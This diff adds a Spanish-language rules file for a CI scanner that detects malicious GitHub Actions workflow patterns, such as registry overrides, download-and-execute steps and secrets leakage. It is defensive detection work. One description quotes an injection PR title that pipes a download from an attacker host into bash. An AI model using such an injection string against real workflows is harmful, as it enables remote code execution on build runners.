@@ -1,0 +1,128 @@
+##
+## Sentinel: GitHub Actions Workflow Scanner Rules
+##
+## Propósito: Detectar configuraciones maliciosas o comprometidas
+##             dentro de archivos .github/workflows/*.yml
+##
+## Vector de ataque cubierto:
+##   - Un atacante que comprometió una cuenta puede modificar el workflow
+##     para redirigir npm a un registry malicioso, exfiltrar tokens,
+##     o ejecutar scripts de descarga disfrazados como steps de CI.
+##
+## Integración: scanner/index.js lo aplica a archivos cuya ruta
+##              contenga ".github/workflows/".
+##
+
+# ─── 1. Registry Override en CI ─────────────────────────────────────────────
+- id: "workflow-registry-override"
+  name: "NPM Registry Override in Workflow"
+  category: "ci-supply-chain"
+  severity: 10
+  pattern: "npm\\s+config\\s+set\\s+registry\\s+(?!https?://registry\\.npmjs\\.org)(?!https?://registry\\.yarnpkg\\.com)"
+  description: >
+    El workflow establece un registry de npm distinto al oficial.
+    Esto puede redirigir todas las instalaciones a un servidor controlado
+    por el atacante, que servirá versiones modificadas de los paquetes.
+    Técnica usada: Dependency Confusion + Registry Poisoning.
+
+# ─── 2. Download-and-Execute Pattern ────────────────────────────────────────
+- id: "workflow-download-and-exec"
+  name: "Download and Execute Shell Pattern"
+  category: "ci-supply-chain"
+  severity: 10
+  pattern: "(curl|wget).*(\\||bash|sh|python|perl|ruby)"
+  description: >
+    El workflow descarga código de internet y lo ejecuta directamente
+    en el runner. Patrón clásico de dropper de primera etapa.
+    Un atacante puede controlar el servidor del que se descarga y
+    cambiar el script después del merge (técnica "post-merge swap").
+
+# ─── 3. NPM Publish sin confirmación ────────────────────────────────────────
+- id: "workflow-auto-publish"
+  name: "Automated NPM Publish Without Review Gate"
+  category: "ci-supply-chain"
+  severity: 9
+  pattern: "npm\\s+publish"
+  description: >
+    El workflow publica automáticamente el paquete en npm.
+    Si el repo está comprometido, esto permite al atacante publicar
+    una versión maliciosa sin intervención humana.
+    Recomendación: usar "needs: review" o ambientes con protección de gates.
+
+# ─── 4. Modificación de .npmrc en CI ────────────────────────────────────────
+- id: "workflow-npmrc-modification"
+  name: "Runtime .npmrc Modification in Workflow"
+  category: "ci-supply-chain"
+  severity: 9
+  pattern: "echo.+>>?\\s*\\.npmrc"
+  description: >
+    El workflow escribe en .npmrc en tiempo de ejecución.
+    Esto puede cambiar el registry, autenticación o proxy
+    en el momento del build sin que aparezca en el diff del PR.
+
+# ─── 5. NPM_TOKEN sin máscara ───────────────────────────────────────────────
+- id: "workflow-token-not-masked"
+  name: "NPM_TOKEN or Auth Token Not Masked"
+  category: "ci-supply-chain"
+  severity: 8
+  pattern: "NPM_TOKEN|GITHUB_TOKEN|_AUTH_TOKEN.+echo|_AUTH_TOKEN.+print"
+  description: >
+    Un token de autenticación está siendo impreso o expuesto en el log.
+    Los tokens en logs de GitHub pueden ser extraídos por atacantes con
+    acceso de lectura al repositorio (cualquier colaborador).
+
+# ─── 6. Uso de runner self-hosted sin restricciones ─────────────────────────
+- id: "workflow-selfhosted-runner"
+  name: "Self-Hosted Runner Without Group Restriction"
+  category: "ci-supply-chain"
+  severity: 6
+  pattern: "runs-on:\\s*\\[?\\s*self-hosted"
+  description: >
+    El workflow usa runners self-hosted. Si el runner no está en un
+    grupo con restricciones, un atacante puede registrar un runner
+    malicioso y "robar" los jobs para exfiltrar secrets.
+    Recomendación: usar runners efímeros con ARC (Actions Runner Controller).
+
+# ─── 7. Step que modifica workflow files ─────────────────────────────────────
+- id: "workflow-self-modification"
+  name: "Workflow Step Modifying .github/workflows"
+  category: "ci-supply-chain"
+  severity: 10
+  pattern: "(echo|cat|cp|mv|tee).+\\.github/workflows"
+  description: >
+    Un step del workflow modifica archivos en .github/workflows/.
+    Esto puede reescribir el propio workflow de Sentinel o eliminar
+    los pasos de instrumentación para evadir la detección.
+
+# ─── 8. Acceso a secrets en steps no oficiales ───────────────────────────────
+- id: "workflow-secrets-in-run"
+  name: "Secrets Printed in Run Step"
+  category: "ci-supply-chain"
+  severity: 9
+  pattern: "\\$\\{\\{\\s*secrets\\..+\\}\\}.*(echo|print|curl|wget)"
+  description: >
+    Un secret de GitHub está siendo pasado a un comando que podría
+    exponerlo (echo, curl, wget). Los secrets expuestos en logs o
+    enviados a servidores externos son un vector de account takeover.
+
+# ─── 9. GitHub Action Injection ──────────────────────────────────────────────
+- id: "workflow-action-injection"
+  name: "GitHub Action Input Injection"
+  category: "injection"
+  severity: 10
+  pattern: "run:\\s*.*\\$\\{\\{\\s*github\\.event\\.(pull_request\\.title|pull_request\\.body|issue\\.title|comment\\.body)\\s*\\}\\}.*"
+  description: >
+    El workflow interpola directamente contexto no confiable (título o cuerpo de PR)
+    dentro de un bloque 'run'. Si el atacante nombra su PR "Title\"; curl attacker.com/malware | bash",
+    obtendrá ejecución remota de código en el Action Runner.
+
+# ─── 10. Over-Permissive Global Tokens ───────────────────────────────────────
+- id: "workflow-global-write-all"
+  name: "Over-Permissive Global Token (write-all)"
+  category: "misconfig"
+  severity: 9
+  pattern: "^permissions:\\s*write-all"
+  description: >
+    El workflow le otorga 'write-all' al token local de GitHub.
+    Si un step del PR se compromete, el atacante puede pushear a main,
+    manipular releases y troyanizar repositorios hermanos.
